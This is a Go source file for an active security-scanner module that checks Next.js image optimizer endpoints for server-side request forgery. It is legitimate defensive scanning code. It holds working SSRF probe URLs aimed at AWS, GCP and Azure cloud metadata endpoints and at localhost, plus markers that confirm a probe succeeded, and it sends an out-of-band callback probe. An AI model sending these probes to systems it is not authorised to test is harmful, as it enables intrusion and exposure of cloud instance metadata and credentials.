package nextjs_image_ssrf

import (
	"fmt"
	"strings"

	"github.com/vigolium/vigolium/pkg/dedup"
	"github.com/vigolium/vigolium/pkg/http"
	"github.com/vigolium/vigolium/pkg/httpmsg"
	"github.com/vigolium/vigolium/pkg/modules/modkit"
	"github.com/vigolium/vigolium/pkg/modules/shared/jsframework"
	"github.com/vigolium/vigolium/pkg/output"
)

type ssrfProbe struct {
	url     string
	markers []string
	desc    string
}

var inBandProbes = []ssrfProbe{
	{
		url:     "http://169.254.169.254/latest/meta-data/",
		markers: []string{"ami-id", "instance-id", "local-hostname", "public-hostname"},
		desc:    "AWS EC2 metadata access via image optimizer",
	},
	{
		url:     "http://127.0.0.1",
		markers: []string{"<html", "<!DOCTYPE", "root:", "localhost"},
		desc:    "Localhost access via image optimizer",
	},
	{
		url:     "http://metadata.google.internal/computeMetadata/v1/",
		markers: []string{"attributes/", "project-id", "instance/"},
		desc:    "GCP metadata access via image optimizer",
	},
	{
		url:     "http://169.254.169.254/metadata/instance",
		markers: []string{"compute", "vmId", "vmSize"},
		desc:    "Azure metadata access via image optimizer",
	},
}

// Module implements the Next.js image optimizer SSRF active scanner.
type Module struct {
	modkit.BaseActiveModule
	ds dedup.Lazy[dedup.DiskSet]
}

// New creates a new Next.js Image Optimizer SSRF module.
func New() *Module {
	m := &Module{
		BaseActiveModule: modkit.NewBaseActiveModule(
			ModuleID,
			ModuleName,
			ModuleDesc,
			ModuleShort,
			ModuleConfirmation,
			ModuleSeverity,
			ModuleConfidence,
			modkit.ScanScopeHost,
			modkit.AllInsertionPointTypes,
		),
		ds: dedup.LazyDiskSet("nextjs_image_ssrf"),
	}
	m.ModuleTags = ModuleTags
	return m
}

// IncludesBaseCanProcess returns false because this module uses a custom CanProcess.
func (m *Module) IncludesBaseCanProcess() bool { return false }

// CanProcess returns true if the request has a response.
func (m *Module) CanProcess(ctx *httpmsg.HttpRequestResponse) bool {
	return ctx != nil && ctx.Request() != nil && ctx.Response() != nil
}

// ScanPerHost tests the Next.js image optimizer for SSRF once per host.
func (m *Module) ScanPerHost(
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
) ([]*output.ResultEvent, error) {
	service := ctx.Service()
	if service == nil {
		return nil, nil
	}

	host := service.Host()

	// Check if this is a Next.js host
	if !jsframework.LooksLikeNextJS(host, ctx.Response().BodyToString()) {
		return nil, nil
	}

	// Dedup by host
	diskSet := m.ds.Get(scanCtx.DedupMgr())
	if diskSet != nil && diskSet.IsSeen(host) {
		return nil, nil
	}

	// Step 1: Verify /_next/image endpoint exists
	checkPath := "/_next/image?url=https%3A%2F%2Fexample.com&w=256&q=75"
	checkRaw, err := httpmsg.SetPath(ctx.Request().Raw(), checkPath)
	if err != nil {
		return nil, nil
	}
	checkRaw, _ = httpmsg.SetMethod(checkRaw, "GET")

	checkReq, err := httpmsg.ParseRawRequest(string(checkRaw))
	if err != nil {
		return nil, nil
	}
	checkReq = checkReq.WithService(ctx.Service())

	checkResp, _, err := httpClient.Execute(checkReq, http.Options{})
	if err != nil {
		return nil, nil
	}
	checkStatus := 0
	if checkResp.Response() != nil {
		checkStatus = checkResp.Response().StatusCode
	}
	checkResp.Close()

	// If 404, the endpoint doesn't exist
	if checkStatus == 404 {
		return nil, nil
	}

	var results []*output.ResultEvent
	target := ctx.Target()

	// Step 2: OAST probe (if available)
	oast := scanCtx.OASTProv()
	if oast != nil && oast.Enabled() {
		requestHash := ctx.Request().ID()
		oastURL := oast.GenerateURL(target, "url", "parameter", ModuleID, requestHash)
		if oastURL != "" {
			probeURL := fmt.Sprintf("/_next/image?url=%s&w=256&q=75", oastURL)
			probeRaw, err := httpmsg.SetPath(ctx.Request().Raw(), probeURL)
			if err == nil {
				probeRaw, _ = httpmsg.SetMethod(probeRaw, "GET")
				probeReq, err := httpmsg.ParseRawRequest(string(probeRaw))
				if err == nil {
					probeReq = probeReq.WithService(ctx.Service())
					resp, _, err := httpClient.Execute(probeReq, http.Options{})
					if err == nil {
						resp.Close()
						// OAST correlation is handled asynchronously
					}
				}
			}
		}
	}

	// Step 3: In-band probes
	for _, probe := range inBandProbes {
		probeURL := fmt.Sprintf("/_next/image?url=%s&w=256&q=75", probe.url)
		probeRaw, err := httpmsg.SetPath(ctx.Request().Raw(), probeURL)
		if err != nil {
			continue
		}
		probeRaw, _ = httpmsg.SetMethod(probeRaw, "GET")

		probeReq, err := httpmsg.ParseRawRequest(string(probeRaw))
		if err != nil {
			continue
		}
		probeReq = probeReq.WithService(ctx.Service())

		resp, _, err := httpClient.Execute(probeReq, http.Options{})
		if err != nil {
			continue
		}

		if resp.Response() != nil && resp.Response().StatusCode == 200 {
			body := strings.ToLower(resp.Body().String())
			for _, marker := range probe.markers {
				if strings.Contains(body, strings.ToLower(marker)) {
					results = append(results, &output.ResultEvent{
						ModuleID: ModuleID,
						Host:     host,
						URL:      target,
						Matched:  target,
						Request:  string(probeRaw),
						Response: resp.FullResponse().String(),
						ExtractedResults: []string{
							fmt.Sprintf("SSRF URL: %s", probe.url),
							fmt.Sprintf("Marker: %s", marker),
						},
						Info: output.Info{
							Name:        "Next.js Image Optimizer SSRF",
							Description: probe.desc,
							Severity:    ModuleSeverity,
							Confidence:  ModuleConfidence,
							Tags:        []string{"nextjs", "ssrf", "image-optimizer"},
							Reference:   []string{"https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps"},
						},
					})
					resp.Close()
					return results, nil
				}
			}
		}
		resp.Close()
	}

	return results, nil
}
